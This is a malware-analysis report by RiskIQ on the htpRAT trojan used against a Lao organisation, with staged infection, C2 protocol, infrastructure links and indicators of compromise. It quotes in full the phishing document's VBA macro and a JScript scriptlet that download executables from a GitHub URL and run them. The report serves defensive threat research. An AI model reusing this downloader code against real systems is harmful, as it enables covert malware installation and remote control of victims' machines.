{
    "id": "5fc87ab5-46a9-4b7b-8bbe-e31df2e524e7",
    "created_at": "2022-10-25T16:48:20.810813Z",
    "updated_at": "2025-03-27T02:05:46.997282Z",
    "deleted_at": null,
    "sha1_hash": "83bc7df01a0a0a638d5bae228c1fcc0c34884ca4",
    "title": "Remote Control Interloper: Analyzing New Chinese htpRAT Attacks Against ASEAN",
    "authors": "RiskIQ",
    "file_creation_date": "2017-11-02T11:14:02Z",
    "file_modification_date": "2017-11-02T11:14:06Z",
    "file_size": 6720185,
    "plain_text": "# Remote Control Interloper:\n Analyzing New Chinese htpRAT\n Malware Attacks Against ASEAN\n\n## By Yonathan Klijnsma\n\n\n-----\n\n### Table of Contents\n\n#### Introduction................................................................................................................................................................................ 3\n\n Initial infection through “APA List.xls”.........................................................................................................................4 GitHub repositories for payload delivery...................................................................................................................... 5\n Staged delivery of the final htpRAT core......................................................................................................................9\n\n Analysis of the htpRAT core...............................................................................................................................................11 Persistence & storage.............................................................................................................................................................11\n Communication protocol.....................................................................................................................................................12\n Execution of operator commands...................................................................................................................................15\n\n Infrastructure analysis..........................................................................................................................................................16\n\n Other activity by the actor using htpRAT..................................................................................................................18\n\n Indicator of compromise.....................................................................................................................................................19\n\n\n-----\n\n### Introduction\n\nOn November 8, 2016 a non-disclosed entity in Laos was spear-phished by a group closely related to\nknown Chinese adversaries and most likely affiliated with the Chinese government. The attackers utilized a\nnew kind of Remote Access Trojan (RAT) that has not been previously observed or reported.\n\nThe new RAT extends the capabilities of traditional RATs by providing complete remote execution of\ncustom commands and programming. htpRAT, uncovered by RiskIQ cyber investigators, is the newest\nweapon in the Chinese adversary’s arsenal in a campaign against Association of Southeast Asian Nations\n(ASEAN).\n\nMost RATs can log keystrokes, take screenshots, record audio and video from a webcam or microphone,\ninstall and uninstall programs and manage files. They support a fixed set of commands operators\ncan execute using different command IDs —’file download’ or ‘file upload,’ for example—and must be\ncompletely rebuilt to have different functionality.\n\nhtpRAT, on the other hand, serves as a conduit for operators to do their job with greater precision\nand effect. On the Command and Control (C2) server side, threat actors can build new functionality in\ncommands, which can be sent to the malware to execute. This capability makes htpRAT a small, agile, and\nincredibly dynamic piece of malware. Operators can change functionality, such as searching for a different\nfile on the victim’s network, simply by wrapping commands.\n\nThe file ‘APA list.xls’ (sha256: f2e7106b9352291824b1be60d6772c29a45269d4689c2733d9eefa0a88eeff89)\nwas delivered through email:\n\nThe top part contains Lao and English: “ທ່ານສາມາດກົດ Enable Content ເບິ່ ງ ແລະ ປຽນຂໍ້ມູນຂອງຕົນ” roughly\ntranslates as “You can click ‘Enable Content’ to (see/change) the data,” with an added example image of\nhow to enable the macros in the document. Based on embedded metadata inside the Excel sheet, the\nlast modified date on the file was “Mon Nov 07 07:18:32 2016,” meaning the document was prepared just\nbefore sending it to the target.\n\n\n-----\n\n### Initial infection through “APA List.xls”\n\nThe XLS document contains the following macro:\n\n\nAttribute VB_Name = “ThisWorkbook”\n\nAttribute VB_Base = “0{00020819-0000-0000-C000-000000000046}”\n\nAttribute VB_GlobalNameSpace = False\n\nAttribute VB_Creatable = False\n\nAttribute VB_PredeclaredId = True\n\nAttribute VB_Exposed = True\n\nAttribute VB_TemplateDerived = False\n\nAttribute VB_Customizable = True\n\nPrivate Sub Workbook_Open()\n\nSet objshell = CreateObject(“wscript.shell”)\n\na = objshell.Run(“cmd.exe /s /c “”powe” + “rshell “”(New-Object System.Net.\nWebClient).DownloadFile(\\””https://raw.githubusercontent.com/justtest1314/justme2/\nmaster/20160728.jpg\\””,$env:appdata+\\””\\\\ctfmon.exe\\””)””; && start %appdata%\\\\\nctfmon.exe”””, 0, False)\n\nSet objshell = Nothing\n\nSheet3.Visible = 1\n\nSheet2.Visible = 1\n\nSheet1.Visible = 1\n\nSheet1.Unprotect\n\nSheet1.Activate\n\n‘Chart3.Visible = 0\n\nEnd Sub\n\n\nOnce the macro is enabled, the following PowerShell command runs to download a file and execute it (the\ndownloaded file is stored in the Application Data folder in the user’s local profile). It is interesting to note\nthe use of GitHub over HTTPS to stage the payload:\n\n\ncmd.exe /s /c powershell (New-Object System.Net.WebClient).DownloadFile(“https://\nraw.githubusercontent.com/justtest1314/justme2/master/20160728.\njpg”,$env:appdata+”\\\\ctfmon.exe”); && start %appdata%\\\\ctfmon.exe\n\n\n-----\n\n#### GitHub repositories for payload delivery\n\nThe threat actor behind this attack uses GitHub repositories to store second stage payloads. The user\naccount used on GitHub is “justtest1314” which holds three repositories, two of which have never been\nused since they were created. The third repository named “justme2” has been actively used to test\ndifferent variations of transferring a payload from GitHub to a target machine over the course of six\nto seven months. The account and the initial repository were created on March 30, 2016, with the first\ncommits starting the same day.\n\nSince the attack on the target in Laos, the attacker decided to clear out the repository. The files were\nprepped and ready for possible attacks since July 28, three months before the above documented\nattack. The files were removed on November 18, approximately 10 days after the attack against the\nLao organization took place. The actor did not remove the actual repository, but rather cleared out the\nrepository using commits in which the attacker removed the files. This allowed us to get the whole history\nof all the commits over time as well as every payload (and every version of the payload):\n\n\n-----\n\n-----\n\nBased on the Git commit history, we can make a small table showing which file was changed at what time:\n\nCommit Files Files de­\nCommit hash Files added\ntimestamp changed leted\n\nMar 30, 2016, 3:55\n9760f003facc0428e44a5e4da2d3d591c6d711ef README.md\nAM GMT+2\n\nMar 30, 2016, 3:56\ncac8dace24e03a48b804e36a50d24f7747538ffc 8001.exe\nAM GMT+2\n\nMar 30, 2016, 3:56\n21e84fa5897de3c7e85d871e4ba33cb0611232ea 8001.exe\nAM GMT+2\n\nMar 30, 2016, 3:58\nbebf35aeb82b80249312ed12cf0df81409537149 test.zip\nAM GMT+2\n\nApr 1, 2016, 10:16\n530ce17aa21250d9ce38525f353badb8c2f0c859 ctfmon.jpg\nAM GMT+2\n\nApr 20, 2016, 3:07\n87d999a3dc71a77ff95ec684e0805505dd822764 script.jpg\nAM GMT+2\n\nMay 5, 2016, 4:54\na63e06112517d9d734b053764354b66e20f12151 2011.jpg\nAM GMT+2\n\nMay 5, 2016, 4:58\neda99ee315d4702b02646a4d8c22b5e2eb5aa01f 2011.jpg\nAM GMT+2\n\nMay 5, 2016, 5:10\n9d43ce169be6c773d8cfc755b36a26118c98ad1d 2011.jpg\nAM GMT+2\n\nJul 28, 2016, 10:55\ne2d697dd03fa6ca535450a771e9b694ae18c22ce 20160728.jpg\nAM GMT+2\n\nNov 18, 2016, 5:00\nf9ba255f5ce38dbe7a860b1de6525fdb5daf9f86 test.zip\nAM GMT+2\n\nNov 18, 2016, 5:00\n3cf50c62107265916777992f7745a1a0ec381d6f script.jpg\nAM GMT+2\n\nNov 18, 2016, 5:00\nbf74c7199eb643fbb2ee998a643469f155439e18 ctfmon.jpg\nAM GMT+2\n\nNov 18, 2016, 5:00 20160728.\n75b55d9dc45b245b91a3bbd5ebaf64a76dee1f56\nAM GMT+2 jpg\n\nNov 18, 2016, 5:01\nfc2a6c0e53b15c93d392f605f3180a43c7c0c78e 2011.jpg\nAM GMT+2\n\nWhile only 20160728.jpg was used in the above mentioned attack, there are many other available\npayloads. All files besides 2011.jpg are portable executables. 2011.jpg is in fact a scriptlet file containing\nsome VBS scripting to download the ‘test.zip’ file seen in the above commit log. The scriptlet looks like\nthis (the three versions only had minimal changes, most importantly the Target variable was changed to a\nrandom path as to not conflict with already existing files):\n\n|Commit timestamp|Commit hash|Files added|Files changed|Files de­ leted|\n|---|---|---|---|---|\n|Mar 30, 2016, 3:55 AM GMT+2|9760f003facc0428e44a5e4da2d3d591c6d711ef|README.md|||\n|Mar 30, 2016, 3:56 AM GMT+2|cac8dace24e03a48b804e36a50d24f7747538ffc|8001.exe|||\n|Mar 30, 2016, 3:56 AM GMT+2|21e84fa5897de3c7e85d871e4ba33cb0611232ea|||8001.exe|\n|Mar 30, 2016, 3:58 AM GMT+2|bebf35aeb82b80249312ed12cf0df81409537149|test.zip|||\n|Apr 1, 2016, 10:16 AM GMT+2|530ce17aa21250d9ce38525f353badb8c2f0c859|ctfmon.jpg|||\n|Apr 20, 2016, 3:07 AM GMT+2|87d999a3dc71a77ff95ec684e0805505dd822764|script.jpg|||\n|May 5, 2016, 4:54 AM GMT+2|a63e06112517d9d734b053764354b66e20f12151|2011.jpg|||\n|May 5, 2016, 4:58 AM GMT+2|eda99ee315d4702b02646a4d8c22b5e2eb5aa01f||2011.jpg||\n|May 5, 2016, 5:10 AM GMT+2|9d43ce169be6c773d8cfc755b36a26118c98ad1d||2011.jpg||\n|Jul 28, 2016, 10:55 AM GMT+2|e2d697dd03fa6ca535450a771e9b694ae18c22ce|20160728.jpg|||\n|Nov 18, 2016, 5:00 AM GMT+2|f9ba255f5ce38dbe7a860b1de6525fdb5daf9f86|||test.zip|\n|Nov 18, 2016, 5:00 AM GMT+2|3cf50c62107265916777992f7745a1a0ec381d6f|||script.jpg|\n|Nov 18, 2016, 5:00 AM GMT+2|bf74c7199eb643fbb2ee998a643469f155439e18|||ctfmon.jpg|\n|Nov 18, 2016, 5:00 AM GMT+2|75b55d9dc45b245b91a3bbd5ebaf64a76dee1f56|||20160728. jpg|\n|Nov 18, 2016, 5:01 AM GMT+2|fc2a6c0e53b15c93d392f605f3180a43c7c0c78e|||2011.jpg|\n\n\n-----\n\n<?XML version=”1.0”?>\n<scriptlet>\n\n<registration\ndescription=”Com”\nprogid=”Commaster”\nversion=”1.00”\nclassid=”{20001111-0000-0000-0000-0000FEEDACDC}”\n<script language=”JScript”>\n<![CDATA[\nvar Source = “https://raw.githubusercontent.com/justtest1314/justme2/master/test.\nzip”;\nvar Target = “c:\\\\windows\\\\temp\\\\”+String(Math.random()*(Math.pow(10,10)))+”.exe”;\nvar Object = new ActiveXObject(‘MSXML2.XMLHTTP’);\nObject.Open(‘GET’, Source, false);\nObject.Send();\nif (Object.Status == 200)\n{\n// Create the Data Stream\nvar Stream = new ActiveXObject(‘ADODB.Stream’);\n\n// Establish the Stream\nStream.Open();\nStream.Type = 1; // adTypeBinary\nStream.Write(Object.ResponseBody);\nStream.Position = 0;\nStream.SaveToFile(Target, 2); // adSaveCreateOverWrite\nStream.Close();\nnew ActiveXObject(“WScript.Shell”).Run(Target,0,true);\n}\n]]>\n</script>\n</registration>\n\n<public>\n<method name=”Exec”></method>\n</public>\n</scriptlet>\n\n\n-----\n\nTest.zip is the first stage payload of htpRAT, similar to the 20160728.jpg file downloaded by the XLS\nmentioned at the start of this report. The following table lists the files and their respected MD5 and\nSHA256 values (note, 2011.jpg exists multiple times due to the multiple commits/changes done on this file:\n\nFilename MD5 SHA256\n\n2011.jpg (commit:\n\nccfccbe54af2aec39a85d28b22614e2f\n\n9d43c169be6c773d8cfc755 a164a57e10d257caa1b6230153c05f5d\n\n43d084a2bcadeae75cad488a8957d862\n\n36a26118c98ad1d)\n\n2011.jpg (commit:\n\n4b2f8cf7d6b2220cc17c66755564e68d3ab997a\n\na63e06112517d9d734 01cddd0509d725c0ee732e2ef6109ecd\n\nf1ab3f47cbe2fa79293b3d38c\n\n053764354b66e20f12151)\n\n2011.jpg (commit:\n\n6b4f605e4cffce074e683f2ade409a\n\neda99ee315d4702b02646a4 81b11c60b28a17c8a39503daf69e2f62\n\n56c318a34f1e4b6b0f15b582c5c66b64e9\n\n8c22b5e2eb5aa01f)\n\n593e13dca3ab6ce6358eec09669f69faef40f1e\n20160728.jpg 5fa81da711581228763a7b7c74992cf8\n67069b08e0fe3f8451aaf62ec\n\nc098cca96c124325d89b433816e6e7fd0b14c51b\n8001.exe 417a608721e9924f089f9143a1687d97\n287c254314f96560975f7864\n\nee1ea9df1f8d7aaa03a93692c1deab09e8d\nctfmon.jpg d5a9d5d1811c149769833ae1cd3b1aca\n834d52e9d5971d013ed259d30229c\n\nc098cca96c124325d89b433816e6e7fd0b14c51b\nscript.jpg 417a608721e9924f089f9143a1687d97\n287c254314f96560975f7864\n\nc098cca96c124325d89b433816e6e7fd0b14c51b\ntest.zip 417a608721e9924f089f9143a1687d97\n287c254314f96560975f7864\n\n#### Staged delivery of the final htpRAT core\n\nThe analysis starts from the downloaded payload coming from the ‘APA list.xls’ file. The payload was\ndownloaded to the application data folder and renamed to ‘ctfmon.exe’ from the original ‘20160728.jpg’\nname (SHA256: 593e13dca3ab6ce6358eec09669f69faef40f1e67069b08e0fe3f8451aaf62ec).\n\nThe author calls this first package ‘Microsoft’ based on the project PDB path still left in the binary:\n\n|Filename|MD5|SHA256|\n|---|---|---|\n|2011.jpg (commit: 9d43c169be6c773d8cfc755 36a26118c98ad1d)|a164a57e10d257caa1b6230153c05f5d|ccfccbe54af2aec39a85d28b22614e2f 43d084a2bcadeae75cad488a8957d862|\n|2011.jpg (commit: a63e06112517d9d734 053764354b66e20f12151)|01cddd0509d725c0ee732e2ef6109ecd|4b2f8cf7d6b2220cc17c66755564e68d3ab997a f1ab3f47cbe2fa79293b3d38c|\n|2011.jpg (commit: eda99ee315d4702b02646a4 8c22b5e2eb5aa01f)|81b11c60b28a17c8a39503daf69e2f62|6b4f605e4cffce074e683f2ade409a 56c318a34f1e4b6b0f15b582c5c66b64e9|\n|20160728.jpg|5fa81da711581228763a7b7c74992cf8|593e13dca3ab6ce6358eec09669f69faef40f1e 67069b08e0fe3f8451aaf62ec|\n|8001.exe|417a608721e9924f089f9143a1687d97|c098cca96c124325d89b433816e6e7fd0b14c51b 287c254314f96560975f7864|\n|ctfmon.jpg|d5a9d5d1811c149769833ae1cd3b1aca|ee1ea9df1f8d7aaa03a93692c1deab09e8d 834d52e9d5971d013ed259d30229c|\n|script.jpg|417a608721e9924f089f9143a1687d97|c098cca96c124325d89b433816e6e7fd0b14c51b 287c254314f96560975f7864|\n|test.zip|417a608721e9924f089f9143a1687d97|c098cca96c124325d89b433816e6e7fd0b14c51b 287c254314f96560975f7864|\n\n\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\microsoft\\Release\\microsoft.pdb\n\n\nUpon execution, it first checks if a debugger is active as well as checks if it is able to execute the ‘ipconfig’\nutility, most likely to ensure the next step will succeed. It then proceeds to drop a CAB file named ‘temp.\ncab’ in the local temp directory. The CAB file is a compressed bundle containing the third stage of the\ninfection. The code decompresses the CAB file by running the Microsoft ‘expand’ utility locally. The\nfollowing three files from the CAB file are placed in the local application data folder in a subfolder called\n‘Microsoft’:\n\n\n-----\n\n|Filename|MD5|SHA256|\n|---|---|---|\n|data|69d24b6fdc87af3a04318e1502e07977|0e2491e1f0e1467121b15b9d03b3fe73ac0a5aa85dc949f8e627ed3 848bdc68a|\n|fsma32.dll|a58f3f9441b4ecc9a0e089578048756f|6cf1cff2e0d1b2d91c417f962a2623077b29318499f8e43e1e 6865ba1eefd234|\n|winnet.exe|c452cd2cc4c91b7da55e83b9eff46589|a80df73828b3397b5e120f3a3b3dee3cee2672aaa2ccb2134c68b2f fe13c0725|\n\n\nAfter decompressing the files, the ‘winnet.exe’ file is executed. This file is a legitimate piece of software;\nit is a part of the F-Secure antivirus suite and used here because it is vulnerable to DLL side loading.\nThe antivirus component normally loads code from a file called ‘fsma32.dll,’ which on a normal system is\nalso a component of the antivirus product, but due to the way it searches for this file and performs no\nverification of its legitimacy, a malicious version of fsma32.dll is started.\n\nThe author calls this DLL ‘windows’ based on the project PDB path still present:\n\n\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\windows\\Release\\windows.pdb\n\n\nThe DLL loads the ‘data’ file, also decompressed from the CAB file, decrypts it and loads the decrypted\ncontent into memory and executes it. The decrypted data content is, in fact, also a DLL file, the\n\n\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\dll\\Release\\dll.pdb\n\n\nfourthstage of the infection. The author calls this DLL ‘dll’ based on the project PDB path still present left:\n\n\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\htpdll\\Release\\htpdll.pdb\n\n\nThis fourth stage of the infection is quite simple. It starts a new svchost process and decrypts a fifth stage\npayload it internally has stored and injects this into the svchost process. This starts a remote thread inside\nthe svchost process to run the injected code. This final payload and the fifth stage is called ‘htpdll’ based\non the project PDB path (this is where the name htpRAT comes from):\n\nThe fifth stage is the final stage and contains the core of the RAT which communicates with the C2 server\nand executes the attacker’s commands.\n\n\n-----\n\n### Analysis of the htpRAT core\n\nAt its core htpRAT is a simple and generically implemented RAT with some quite interesting\nimplementations of its communication protocol, command execution and configuration storage systems.\n\n#### Persistence & storage\n\nInitially when htpRAT starts it creates a mutexes to ensure there is only one instance running. The name of\nthe mutex can be used as an indicator on an active system, it is hard coded as:\n\n\n{3084ADEC-04CF-4981-B6A0-87DC5C385E24}\n\n\nIt then obtains its local path in the appdata folder (which is %LOCALAPPDATA%\\Microsoft\\). This path is\nused to store a file called ‘token.ini’ in which the system uptime (in milliseconds) is contained. The token.ini\nfile is formatted using the INI format through the use of the GetPrivateProfileString and WriteProfileString\nfunctions of the WinAPI. htpRAT uses the following hardcoded information to structure its app and key\nnames in the INI file. This can be used to filter out legitimate ‘token.ini’ files, if encountered:\n\n\n{3084ADEC-04CF-4981-B6A0-87DC5C385E24}\n\n\nOnce htpRAT has its INI file written, it sets a startup entry in the registry to ensure automatic startup\nwhen a system is rebooted. A key is created under:\n\n\nSoftware\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\n\n\n-----\n\nThe keyname ‘WindowsApp’ has the value of the wininit.exe binary location in the Microsoft subfolder in\nlocal appdata.\n\n#### Communication protocol\n\nhtpRAT uses a custom communication protocol utilizing a JSON format internally which is encrypted and\nwrapped in HTTP requests. The base format of a request sent to the C2 server looks like this:\n\n\n{\ncommand: “<command string>”,\ncontent: “<command id result>”,\nmid: “<machine ID>”,\ncid: “<command id>”,\n}\n\n\nIndividually the field values contain the following:\n\n command: The type of action/command the request has data for in its content field. The two\n\nknown values for this are:\n\n    - online: Set when the malware is polling the C2 server for new commands. (It also functions as\nan initial check-in; the client simply starts polling for commands on startup). When this value is\nset, the content field contains the following fields:\n\n– tag: The campaign tag which is hardcoded.\n\n– name: The computer name is obtained via a call to GetComputerName from the WinAPI.\n\n    - cmd: This value is seen when the client has executed commands as per instructions from the C2\nserver. When this value is set, the content field contains the result from executing the command\nobtained from the C2. Additionally the cid field contains a special command ID used for this\ncommand.\n\n content: The command field can contain a subset of different keywords that change the content of\n\nthe “content” field. The field then contains the result provided by the operator on the C2 side as\nlong as the command field is set to “cmd”. Otherwise, when the command field is set to “online”\nthis field contains the campaign tag and computer name as explained in the subsection above. The\ndata in this field is base64 encoded when it is assigned to this field to retain any newlines / data, as\nit can contain arbitrary data from command execution results.\n\n mid: A unique machine ID based on the GetTickCount value, which is called the first the RAT ever\n\nruns. This function returns the amount of milliseconds the system has been up, this is used (in\ncombination with the computer name) to identify a unique client.\n\n cid: The command ID either set to online when polling for new commands, or it is set to the\n\ncommand ID supplied by the C2. When a command is obtained from the C2, this command\ncontains a special command ID supplied by the actor issuing the command. This command ID is\nreplicated back to the C2 with the results of the requested command.\n\nThe completed JSON object is, after being filled with the correct information, encrypted before being sent\nto the C2 through a HTTP POST request. The encryption of the POST data is done with a custom algorithm.\nA key is generated per request to the C2 server and is seeded through the return of the GetTickCount\nfunction. First a 10 character string is generated by picking 10 numbers at random. The pipe symbol | is\nadded at the end of the string making the entire key 11 characters. The check-in JSON data is then XOR’d\nwith the generated key. Then the data is prepared for the POST request as follows:\n\n\n-----\n\n The key is XOR’d with itself character by character: first character with the second, second with the\n\nthird until the last character is hit which is XOR’d with the first character again.\n\n The encrypted checkin data is prepended with the encrypted key and then encoded with base64.\n\n The first character of the plain XOR key is prepended in front of the base64 encoded data.\n\nThis prepending of the first key of the XOR key allows the C2 server to calculate back the entire key and\ndecrypt the data. To give a good example of this protocol, we can work it back from from a network\ncapture of a victim checking in to the C2 server:\n\nThe encrypted communication blob is:\n\n\n5BQQECQ0FBwIDS0lOEldfVFlQWFAVRhdfWlxQWlQUGBdeVl9aRFxaRRQUDVwXVU16CW1mVV14FX9Ebl\nwR3h1fkIlYgFYeVB1B393fTlgAFxgb2J/cH1ZTAgSGBAbWVhSFhdGFRIFBQoCBAUGD14ZEBZTUFAT\ng4XXlpeWFlXURNL\n\n\nThe first layer of the data is the first plaintext character of the XOR key followed by the base64 encoded\nand XOR’d check-in data. We can split up like this:\n\n   - [] First character of the key: 5\n\n   - [] Base64 encoded check-in data:\n\n\n\n\n\nBQQECQ0FBwIDS0lOEldfVFlQWFAVRhdfWlxQWlQUGBdeVl9aRFxaRRQUDVwXVU16CW1m\nV14FX9EblwR3h1fkIlYgFYeVB1B393fTlgAFxgb2J/cH1ZTAgSGBAbWVhSFhdGFRIFBQo\nBAUGD14ZEBZTUFATFg4XXlpeWFlXURNL\n\n\nFirst thing to do is decoding the XOR key out of the data. We decode the base64 data and grab the first\n11 bytes. We XOR the first byte of this data with the first character we obtained from the check-in, this\ngives us the second character of the key. With the second character of the key we can XOR the third and\nso on. We continue this until we get the entire key back in plaintext, for the provided data above the key\nis: 5040941647|\n\n\n-----\n\nIn python extracting the key from the check-in data looks like this:\n\nWe can, using the extracted key, decrypt the rest of the data with a simple XOR loop. Decrypted we end\nup with the following JSON data for this check-in:\n\nFor its HTTP communication htpRAT uses a hardcoded user-agent:\n\n\nMozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\n\n\nWhile not in use in this attack, htpRAT has an internal configuration which allows the operator to build\nhtpRAT clients with any of the following:\n\n Proxy information (username, password, url)\n\n Arbitrary raw request headers and data\n\n Explicitly it has a field for the ‘Cookie’ header\n\n WinHTTP request options (Timeouts)\n\nThese options are visible when we reverse engineered the malware, but they were not put to use in this\nbuild of htpRAT.\n\n\n-----\n\n#### Execution of operator commands\n\nThe design of htpRAT differs from ‘common’ RATs. Most RATs feature a fixed set of commands that\nattackers can execute with different command IDs. For example, file download or file upload would both\nbe unique functionalities of the RAT. htpRAT doesn’t adhere to this structure. Instead, the malware creator\ndecided to generalize this concept by having the RAT execute commands directly as provided from a\nC2 server. This means, for example, there is no specific function to get screenshots on the host; instead,\non the C2 server side, the operator has a button which says ‘Get Screenshot’ which simply generates a\nset of commands to execute through something like PowerShell to take a screenshot. This makes htpRat\ndynamic and, subject to change. Any new functionality the operators want they simply implement by\nwrapping commands on the C2 without having to update the htpRAT source code.\n\nCoincidentally, this also means we cannot give a fixed list of functionality for this RAT. Its functionality is\ncompletely dependent on what rights the RAT was able to obtain upon installation and what the operator\nwants to do.\n\nThe way the execution of commands when the bot starts is implemented is as follows, :\n\n A separate command prompt process is started which can be communicated with via named pipes.\n\n Any incoming commands from the C2 are executed via the named pipes on the sub process.\n\n Results are read from the named pipe and communicated back to the C2 server.\n\n\n-----\n\n### Infrastructure analysis\n\nBased on the analysis of the malware we know that qf.laoscript.org is the C2 host for this malware.\nThe WHOIS data for this domain is quite interesting as the name ‘John Durdin’ can be seen on multiple\ndomains, but what stands out is the difference in email address used in the registrations. The following is a\nsearch on domain registrations for this name in PassiveTotal--most have the same email address, but one\nstands out. The email address is the registered domain:\n\nIf we look more closely, we see that there is also a .NET domain for laoscript. The C2 domain is clearly\nregistered to raise fewer suspicions by mimicking the other domain. It becomes even more clear when we\nsee all the registration information was just copied if you compare laoscript.net and laoscript.org:\n\nThe only thing the actor could not fake was the email address due to the fact that an email address must\nbe used to activate the domain at the registrar. The use of the laoscript name is quite interesting as it\n\n\n-----\n\nshows real active targeting. The real laoscript website is a piece of software that helps with the input of\nthe Lao language text on computers which gives the actor good leverage for social engineering:\n\nLooking at the domain we can see it has been registered since 2014 which means this C2 domain has\nbeen under the control of the actor for at least two years. We can also see that in the past, the domain\nhas been used in other attack campaigns as well which indicates there are more yet undiscovered victims.\nThere are also two samples that connect to qf.laoscript.org which are not htpRAT, they are in fact\nvariations of the well known PlugX malware:\n\n\n\n- 5e0019485fbfa2796ec0f1315c678b4a3fb711aef5d97f42827c363ccd163f6d (First seen\n\n2015-07-10)\n\n- eeb34edec5fd04e6a44bf5c991eaf79c68432d4d0037b582bcd9062cc2b94c62 (First seen\n\n2015-07-17)\n\n\nBoth also use DLL side loading techniques but using a different antivirus product to leverage execution\nthrough. Still this means there’s an active connection between the current actors with the new unknown\nhtpRAT and where they in the past used PlugX. While we can only guess for reasons why this actor\ndecided to develop their own tool instead of continuing to use PlugX, it seems it is at least a step up in\nterms of detection of the malware. PlugX was becoming quite common and easy to detect on both the\nnetwork as well as file system level.\n\n\n-----\n\n### Other activity by the actor using htpRAT\n\nGoing through older samples connecting to the C2 domain for htpRAT, we mostly find a variety of\nPlugX samples. We also ran into the exploit activity by the group, ShadowServer, documented in their\n[paper, “The Italian Connection: An analysis of exploit supply chains and digital quartermasters.” Page six](http://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2015/Aug.10.The_Italian_Connection_An_analysis_of_exploit_supply_chains_and_digital_quartermasters/HTExploitTelemetry.pdf)\ndescribes the use of the HackingTeam leaked exploits by various groups.\n\nOne interesting connection is a piece of malware called ‘MyHNServer’ which is a packaged PlugX payload.\n\nThis sample also connects to ‘qf.laoscript.org’ and has quite an interesting PDB path:\n\nThe first foldername ‘巴哥组’ is interesting; in context it translates to the ‘elderly’ or ‘brother’\ngroup most likely referring to a more senior/experienced and respected group. If we correlate\nsamples based on this PDB path, we get into some really interesting attacks. One other PDB path\nwe can find based on the group’s name is for another piece of malware called ‘MyCL’ (sha256:\n2fa07d41385c16b0f6ad32d12908db1743ca77db0b71e6cfd0fde76ef146e983):\n\nThe first word ‘炮灰’ means ‘source code,’ and the second ‘源码’ means ‘victims.’ By itself the sample isn’t\nthat interesting, although it isn’t PlugX or htpRAT. It is interesting because of the C2 server used: ‘data.\ndubkill.com’. This domain has been widely used in other attacks in Vietnam as documented by BKav, a\n[Vietnamese security company: http://genk.vn/internet/vu-gia-mao-email-ket-luan-thu-tuong-phat-hien-](http://genk.vn/internet/vu-gia-mao-email-ket-luan-thu-tuong-phat-hien-bien-the-virus-bien-dong-2015060612185601.chn)\n[bien-the-virus-bien-dong-2015060612185601.chn. Looking at the registration information for the dubkill](http://genk.vn/internet/vu-gia-mao-email-ket-luan-thu-tuong-phat-hien-bien-the-virus-bien-dong-2015060612185601.chn)\ndomain, we can find an interesting link to a more recent government attack. The domain is registered to\na person using the email address ‘dubkill@163.com,’ this same email address was also used to register\n‘dcsvn.org’ which was used to imitate the official military domain in Vietnam. This attack was publicly\n[documented by BKav (http://security.bkav.com/home/-/blogs/malware-attacking-vietnam-airlines-](http://security.bkav.com/home/-/blogs/malware-attacking-vietnam-airlines-appears-in-many-other-agenci-1/normal?p_p_auth=DHFn7deT)\n[appears-in-many-other-agenci-1/normal?p_p_auth=DHFn7deT) and the Vietnamese government (http://e.](http://security.bkav.com/home/-/blogs/malware-attacking-vietnam-airlines-appears-in-many-other-agenci-1/normal?p_p_auth=DHFn7deT)\n[gov.vn/theo-doi-ngan-chan-ket-noi-va-xoa-cac-tap-tin-chua-ma-doc-a-NewsDetails-37486-14-186.html).](http://e.gov.vn/theo-doi-ngan-chan-ket-noi-va-xoa-cac-tap-tin-chua-ma-doc-a-NewsDetails-37486-14-186.html)\nAdditionally there is IP address overlap between ‘dcsvn.org’ and ‘laoscript.org’ in 2015.\n\nFollowing all these links over WHOIS, the shared domains and shared working paths reveals the\nadversary’s web is wider and deeper than expected. While this report was solely written to inform\nabout a new piece of malware used by this adversary this last section highlights the size and amount of\noperations.\n\n\n-----\n\n### Indicator of Compromise\n\nWhile we mentioned some other C2 domains in this article, the IOCs listed below tie in directly with\nconfirmed activity for htpRAT for the above detailed campaign. All those IOCs can also be obtained from\nthe public PassiveTotal project which will be kept in sync with new developments: [%PT PROJECT%].\n\nhtpRAT Network IOCs:\n\nDomain IP\n\nqf.laoscript.org 128.199.245.204\n\nhtpRAT Filesystem IOCs:\n\n|Domain|IP|\n|---|---|\n|qf.laoscript.org|128.199.245.204|\n\n|Filename|MD5|SHA256|\n|---|---|---|\n|data|69d24b6fdc87af3a04318e1502e07977|0e2491e1f0e1467121b15b9d03b3fe73ac0a5aa85dc 949f8e627ed3848bdc68a|\n|fsma32.dll|a58f3f9441b4ecc9a0e089578048756f|6cf1cff2e0d1b2d91c417f962a2623077b29318499f8e43e1e 6865ba1eefd234|\n|winnet.exe|c452cd2cc4c91b7da55e83b9eff46589|a80df73828b3397b5e120f3a3b3dee3cee2672aaa2ccb2134c68b2f fe13c072|\n|2011.jpg|a164a57e10d257caa1b6230153c05f5d|ccfccbe54af2aec39a85d28b22614e2f43d084a2bcadeae75ca d488a8957d862|\n|2011.jpg|01cddd0509d725c0ee732e2ef6109ecd|4b2f8cf7d6b2220cc17c66755564e68d3ab997af1ab3f47cbe 2fa79293b3d38c|\n|2011.jpg|81b11c60b28a17c8a39503daf69e2f62|6b4f605e4cffce074e683f2ade409a56c318a34f1e4b6b0f15b582c 5c66b64e9|\n|20160728. jpg|5fa81da711581228763a7b7c74992cf8|593e13dca3ab6ce6358eec09669f69faef40f1e67069b08e0fe 3f8451aaf62ec|\n|8001.exe, script.jpg, test.zip|417a608721e9924f089f9143a1687d97|c098cca96c124325d89b433816e6e7fd0b14c51b 287c254314f96560975f7864|\n|ctfmon.jpg|d5a9d5d1811c149769833ae1cd3b1aca|ee1ea9df1f8d7aaa03a93692c1deab09e8d834d52e9d5971d013ed2 59d30229c|\n|APA list.xls|f6d75257c086cd20ec94f4f146676c6e|f2e7106b9352291824b1be60d6772c29a45269d4689c2733d9eef a0a88eeff89|\n\n\n-----\n\nhtpRAT Miscellaneous IOCs:\n\nDescription Value\n\nINI key name {80478813-B963-4C21-953E-D51544A1863B}\n\nRuntime mutex {3084ADEC-04CF-4981-B6A0-87DC5C385E24}\n\nUseragent Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 